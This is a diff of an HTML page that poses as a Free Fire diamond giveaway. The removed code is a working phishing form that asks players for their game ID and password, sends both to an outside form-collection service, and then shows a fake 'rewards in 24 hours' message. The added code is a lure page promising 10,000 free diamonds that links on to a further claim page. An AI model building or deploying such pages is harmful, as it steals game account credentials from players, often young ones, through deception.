@@ -3,107 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Fire: Exclusive Rewards</title>
+    <title>Free Fire Diamond Giveaway</title>
     <style>
-        /* Background Image from a Gaming Source */
         body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
-                        url('https://images.unsplash.com/photo-1542751371-adc38448a05e?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80'); /* Dark gaming setup background */
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: white;
+            margin: 0; padding: 0; font-family: 'Arial Black', sans-serif;
+            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), 
+                        url('https://wallpaperaccess.com/full/1213589.jpg'); /* FF Characters Background */
+            background-size: cover; background-position: center; height: 100vh;
+            display: flex; justify-content: center; align-items: center; color: white; text-align: center;
         }
-
-        .login-box {
-            background: rgba(20, 20, 20, 0.9);
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 0 20px #ff4500; /* Glowing orange effect */
-            width: 100%;
-            max-width: 350px;
-            text-align: center;
-            border: 1px solid #ff4500;
+        .container { background: rgba(0,0,0,0.8); padding: 30px; border-radius: 20px; border: 2px solid #00fbff; box-shadow: 0 0 20px #00fbff; max-width: 400px; }
+        h1 { color: #00fbff; font-size: 2.5rem; text-shadow: 2px 2px #000; }
+        .diamond-text { color: #ffea00; font-size: 1.5rem; margin: 10px 0; }
+        .disclaimer { font-size: 12px; color: #aaa; margin-bottom: 20px; }
+        .btn {
+            background: #00fbff; color: #000; padding: 15px 40px; text-decoration: none;
+            font-weight: bold; border-radius: 50px; font-size: 1.2rem; transition: 0.3s;
         }
-
-        h2 { color: #ff4500; text-transform: uppercase; letter-spacing: 2px; }
-        p { font-size: 14px; margin-bottom: 20px; color: #ccc; }
-
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #444;
-            background: #111;
-            color: white;
-            border-radius: 5px;
-            box-sizing: border-box; /* Important for alignment */
-        }
-
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #ff4500;
-            border: none;
-            color: white;
-            font-weight: bold;
-            text-transform: uppercase;
-            cursor: pointer;
-            border-radius: 5px;
-            margin-top: 10px;
-            transition: 0.3s;
-        }
-
-        button:hover { background: #e63e00; box-shadow: 0 0 10px #ff4500; }
-
-        #blocked-message { display: none; }
-        .already-submitted { color: #ff4500; font-size: 18px; font-weight: bold; }
+        .btn:hover { background: #008cff; color: white; box-shadow: 0 0 15px #00fbff; }
     </style>
 </head>
 <body>
-
-<div class="login-box" id="form-container">
-    <h2>Diamond Reward</h2>
-    <p>Login with your Free Fire details to claim your daily rewards.</p>
-    
-    <form id="ff-form" action="https://formspree.io/f/xjglvnrj" method="POST">
-        <input type="text" name="FF_ID" placeholder="Enter Your Free Fire ID" required>
-        <input type="password" name="Password" placeholder="Enter Your Password" required>
-        <button type="submit">Claim Rewards</button>
-    </form>
-</div>
-
-<div class="login-box" id="blocked-message">
-    <h2>Thanks for using our website!</h2>
-    <p class="already-submitted">Your response has already been submitted.</p>
-    <p>Check your in-game mail within 24 hours.</p>
-</div>
-
-<script>
-    const formContainer = document.getElementById('form-container');
-    const blockedMessage = document.getElementById('blocked-message');
-    const form = document.getElementById('ff-form');
-
-    // CHECK IF BLOCKED
-    if (localStorage.getItem('ff_submitted') === 'true') {
-        formContainer.style.display = 'none';
-        blockedMessage.style.display = 'block';
-    }
-
-    // HANDLE SUBMISSION
-    form.onsubmit = function() {
-        localStorage.setItem('ff_submitted', 'true');
-        // The page will redirect to Formspree's "Thank you" page automatically.
-        // When they come back to your link, they will be blocked.
-    };
-</script>
-
+    <div class="container">
+        <h1>EXCLUSIVE GIVEAWAY</h1>
+        <p class="diamond-text">💎 10,000 DIAMONDS 💎</p>
+        <p>Official Season Reward for Active Players</p>
+        <p class="disclaimer">Disclaimer: Only one claim per UID. Prizes are sent within 24 hours.</p>
+        <a href="claim.html" class="btn">ENTER NOW</a>
+    </div>
 </body>
 </html>
